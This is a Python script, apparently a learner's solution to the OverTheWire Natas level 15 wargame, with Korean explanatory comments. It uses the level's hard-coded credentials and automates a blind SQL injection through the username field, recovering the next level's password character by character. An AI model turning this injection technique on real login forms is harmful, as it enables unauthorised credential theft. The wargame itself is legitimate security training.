import requests
import string

username='natas15'
password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

url='http://natas15.natas.labs.overthewire.org/?debug=true'
letters=string.ascii_letters+string.digits # 모든 영문자(대소문자 포함)+ 숫자 문자로('0123456789')

natas16_pass=''

while len(natas16_pass)<32:
    for char in letters:
        response=requests.post(url,auth=(username,password),data= {"username":'natas16" AND BINARY password LIKE "'+natas16_pass+char+'%" #'},)
        # response는 객체 (클래스를 가진 인스턴스)
        # data로 보내야 하는 건 post로 보내는 요청에서 input으로 받는 인자들은 data인자로 보내야함 
        # auth는 intercept했을 경우 authorization이 있으므로, 파이썬에서 auth를 저렇게 입력할 경우 id:pwd를 base64인코딩하여 헤더에 넣어줌 
        if 'exists' in response.text: # response의 text속성은 html코드 body응답 문자열 버전 뜻함
            natas16_pass+=char
            print(natas16_pass)
            break

print(natas16_pass)
